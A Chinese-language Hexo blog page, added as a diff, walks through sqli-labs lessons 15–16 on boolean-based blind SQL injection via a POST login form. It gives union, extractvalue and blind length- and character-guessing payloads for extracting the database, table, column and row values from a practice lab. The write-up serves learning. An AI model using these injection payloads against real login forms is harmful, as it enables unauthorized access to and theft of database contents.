@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.11.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="Less-15经过测试这一关的注入点为 ‘ ，然后测试列数为2。接下来测试一下显示位。输入语句：1’ union select 1,2 #">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Less 15~16（基于POST表单提交方式的布尔盲注）">
+<meta property="og:url" content="http://example.com/2023/03/20/Less-15-16%EF%BC%88%E5%9F%BA%E4%BA%8EPOST%E8%A1%A8%E5%8D%95%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F%E7%9A%84%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%89/index.html">
+<meta property="og:site_name" content="临摹">
+<meta property="og:description" content="Less-15经过测试这一关的注入点为 ‘ ，然后测试列数为2。接下来测试一下显示位。输入语句：1’ union select 1,2 #">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/image/Less-15~16/1.png">
+<meta property="og:image" content="http://example.com/image/Less-15~16/2.png">
+<meta property="article:published_time" content="2023-03-19T16:28:06.000Z">
+<meta property="article:modified_time" content="2023-03-20T15:52:26.195Z">
+<meta property="article:author" content="Justin">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/image/Less-15~16/1.png">
+
+
+<link rel="canonical" href="http://example.com/2023/03/20/Less-15-16%EF%BC%88%E5%9F%BA%E4%BA%8EPOST%E8%A1%A8%E5%8D%95%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F%E7%9A%84%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%89/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/03/20/Less-15-16%EF%BC%88%E5%9F%BA%E4%BA%8EPOST%E8%A1%A8%E5%8D%95%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F%E7%9A%84%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%89/","path":"2023/03/20/Less-15-16（基于POST表单提交方式的布尔盲注）/","title":"Less 15~16（基于POST表单提交方式的布尔盲注）"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Less 15~16（基于POST表单提交方式的布尔盲注） | 临摹</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">临摹</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-15"><span class="nav-number">1.</span> <span class="nav-text">Less-15</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8C%9C%E8%A7%A3%E9%95%BF%E5%BA%A6"><span class="nav-number">1.1.</span> <span class="nav-text">猜解长度</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8C%9C%E8%A7%A3%E5%85%B7%E4%BD%93%E5%90%8D%E5%AD%97"><span class="nav-number">1.2.</span> <span class="nav-text">猜解具体名字</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8C%9C%E8%A7%A3%E8%A1%A8%E9%95%BF%E5%BA%A6"><span class="nav-number">1.3.</span> <span class="nav-text">猜解表长度</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8C%9C%E8%A7%A3%E8%A1%A8%E5%90%8D"><span class="nav-number">1.4.</span> <span class="nav-text">猜解表名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8C%9C%E8%A7%A3%E5%88%97%E5%90%8D%E9%95%BF%E5%BA%A6"><span class="nav-number">1.5.</span> <span class="nav-text">猜解列名长度</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8C%9C%E8%A7%A3%E5%88%97%E5%90%8D"><span class="nav-number">1.6.</span> <span class="nav-text">猜解列名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8C%9C%E8%A7%A3%E5%AD%97%E6%AE%B5%E5%80%BC"><span class="nav-number">1.7.</span> <span class="nav-text">猜解字段值</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-16"><span class="nav-number">2.</span> <span class="nav-text">Less-16</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Justin</p>
+  <div class="site-description" itemprop="description">适得浮生</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/20/Less-15-16%EF%BC%88%E5%9F%BA%E4%BA%8EPOST%E8%A1%A8%E5%8D%95%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F%E7%9A%84%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Justin">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="临摹">
+      <meta itemprop="description" content="适得浮生">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Less 15~16（基于POST表单提交方式的布尔盲注） | 临摹">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Less 15~16（基于POST表单提交方式的布尔盲注）
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-03-20 00:28:06 / 修改时间：23:52:26" itemprop="dateCreated datePublished" datetime="2023-03-20T00:28:06+08:00">2023-03-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Sql/" itemprop="url" rel="index"><span itemprop="name">Sql</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h1><p>经过测试这一关的注入点为 ‘ ，然后测试列数为2。接下来测试一下显示位。<br>输入语句：1’ union select 1,2 #</p>
+<span id="more"></span>
+<p><img src="/image/Less-15~16/1.png" alt="打开方式"><br>可以看到虽然成功登录了，但是没有显示位，接下来我们首先尝试报错注入。<br>输入语句：1’ and extractvalue(1,concat(0x7e,database())) #<br>页面回显：<br><img src="/image/Less-15~16/2.png" alt="打开方式"><br>可以看到并没有回显报错信息，说明没有报错回显。那就考虑一下盲注，这里观察到页面是有正确登录之后的显示和登录失败的显示的。所以这里考虑使用布尔盲注，如果是不管怎么样都只显示一种结果那就考虑时间盲注。</p>
+<h2 id="猜解长度"><a href="#猜解长度" class="headerlink" title="猜解长度"></a>猜解长度</h2><p>输入语句：1’ or length(database())&gt;8 #<br>这里要注意的是不能使用关键字 and 了，要使用关键字 or ，因为我们输入的用户名和密码不一定正确，但是关键字 and 是前后都要进行判断是否正确，一旦我们输入的用户名和密码不对的话直接就判定错误了，没有办法执行我们的注入语句，但是 or 不一样，他的意思是前面的或者后面的，有一个正确就可以，就算我们用户名和密码不正确，但是后面的注入语句正确了，也可以。<br>可以看到页面还是回显错误，那说明数据库名字长度小于8…</p>
+<h2 id="猜解具体名字"><a href="#猜解具体名字" class="headerlink" title="猜解具体名字"></a>猜解具体名字</h2><p>输入语句：1’ or left(database(),1)&gt;’a’ #<br>可以看到页面是正常登录的页面，说明数据库名字的第一个字母的ASCII码值是大于字母 ‘a’ 的ASCII码值的…</p>
+<h2 id="猜解表长度"><a href="#猜解表长度" class="headerlink" title="猜解表长度"></a>猜解表长度</h2><p>输入语句：1’ or length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&gt;6 #<br>页面回显错误，说明第一张表名字的长度小于6…</p>
+<h2 id="猜解表名"><a href="#猜解表名" class="headerlink" title="猜解表名"></a>猜解表名</h2><p>输入语句：1’ or left((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1)&gt;’f’ #<br>可以看到页面回显错误，说明该表名名字的第一个字母的ASCII码值小于字母 ‘f’ 的ASCII码值。之后就按照这种方法去测试就可以。这里不再赘述。</p>
+<h2 id="猜解列名长度"><a href="#猜解列名长度" class="headerlink" title="猜解列名长度"></a>猜解列名长度</h2><p>输入语句：1’ or length((select column_name from information_schema.columns where table_name&#x3D;’emails’ limit 0,1))&gt;3 #<br>页面回显错误，说明 ‘emails’ 表的第一列的名字长度小于3。</p>
+<h2 id="猜解列名"><a href="#猜解列名" class="headerlink" title="猜解列名"></a>猜解列名</h2><p>输入语句：1’ or left((select column_name from information_schema.columns where table_name&#x3D;’emails’ limit 0,1),1)&gt;’a’ #<br>可以看到出现了正常登录的界面，说明列名第一个字母的ASCII码值大于字母 ‘a’ 的ASCII码值。<br>输入语句:1’ or ascii((select column_name from information_schema.columns where table_name&#x3D;’emails’ limit 0,1))&gt;127 #<br>这条语句我使用了 ascii() 函数，该函数的含义是返回字符串最左边字符的ASCII码值。</p>
+<h2 id="猜解字段值"><a href="#猜解字段值" class="headerlink" title="猜解字段值"></a>猜解字段值</h2><p>输入语句：1’ or left((select id from emails limit 0,1),1)&gt;0 #<br>1’ or left((select id from emails limit 0,1),1)&gt;1 #<br>可以推断第一个字段值是1。其他字段值这里不在赘述。</p>
+<h1 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h1><p>这一关和十五关用的方法一样，只不过注入点换成了 “) 。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/03/19/Less-13-14-%E5%9F%BA%E4%BA%8EPOST%E8%A1%A8%E5%8D%95%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F%E7%9A%84%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="prev" title="Less 13~14(基于POST表单提交方式的报错注入)">
+                  <i class="fa fa-chevron-left"></i> Less 13~14(基于POST表单提交方式的报错注入)
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Justin</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
